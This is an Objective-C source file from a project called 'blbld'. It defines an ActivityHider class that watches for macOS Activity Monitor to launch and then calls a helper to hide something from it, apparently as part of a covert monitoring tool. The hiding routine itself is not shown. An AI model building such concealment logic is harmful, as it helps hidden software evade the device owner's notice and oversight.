//
//  ActivityHider.m
//  blbld
//
//  Created by ophat on 3/9/16.
//
//

#import "ActivityHider.h"

#import "blbldUtils.h"
#import "TargetIdentity.h"

@implementation ActivityHider

@synthesize mActivityHiderPath;

- (void) start{
    DLog(@"registerNotificationForActivityMonitor");
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self selector:@selector(didFinishLaunch:) name:NSWorkspaceDidLaunchApplicationNotification object:nil];
}

- (void) stop{
   [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceDidLaunchApplicationNotification object:nil];
}

- (void) didFinishLaunch:(NSNotification *)notification {
    //DLog(@"notification : %@",notification);
    NSDictionary *userInfo = [notification userInfo];
    if ([[userInfo objectForKey:@"NSApplicationBundleIdentifier"]isEqualToString:kActivityMonitor]) {
        [blbldUtils hideActivityMonitor:self.mActivityHiderPath];
    }
}

-(void) dealloc {
    self.mActivityHiderPath = nil;
    [super dealloc];
}
@end
